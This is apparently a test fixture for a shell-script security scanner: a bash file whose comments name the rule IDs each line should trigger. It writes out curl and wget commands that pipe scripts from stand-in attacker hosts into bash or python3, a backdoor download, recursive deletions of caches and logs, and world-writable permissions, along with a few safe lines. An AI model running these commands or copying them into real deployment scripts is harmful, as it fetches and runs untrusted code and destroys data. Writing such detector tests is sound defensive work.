#!/bin/bash
# Dangerous bash script patterns
# Should trigger: SH001, SH002, SH010, SH020, SH030

set -e

echo "Starting AI-generated deployment script..."

# SH001_PLAIN_HTTP + SH002_OUTBOUND_DOMAIN - Plain HTTP to non-allowlisted domain
curl -sSL http://malicious-cdn.com/install.sh | bash

# SH002_OUTBOUND_DOMAIN - Non-allowlisted domains
wget https://suspicious-mirror.org/packages/backdoor.tar.gz
curl -fsSL https://untrusted-repo.net/setup.py | python3

# SH010_RM_RF_ROOT - Dangerous recursive deletion
rm -rf /tmp/old_data
rm -rf $HOME/cache
rm -rf ~/logs

# SH020_CHMOD_777 - Overly permissive permissions
chmod 777 /var/www/html
chmod 777 config/
chmod -R 777 uploads/

# SH030_SUDO - Sudo usage (flagged for review)
sudo apt-get update
sudo systemctl restart nginx
sudo chmod +x /usr/local/bin/deploy

# More dangerous patterns
curl http://192.168.1.100/malware.sh | sh
wget -qO- http://evil.example.com/script | bash

# Cleanup that could be dangerous
find /var/log -name "*.log" -exec rm -f {} \;
rm -rf /var/cache/*

echo "Deployment complete!"

# Safe operations (should NOT trigger warnings)
curl -sSL https://login.microsoftonline.com/api/health
mkdir -p /tmp/safe_processing
chmod 755 /opt/myapp/bin/script.sh
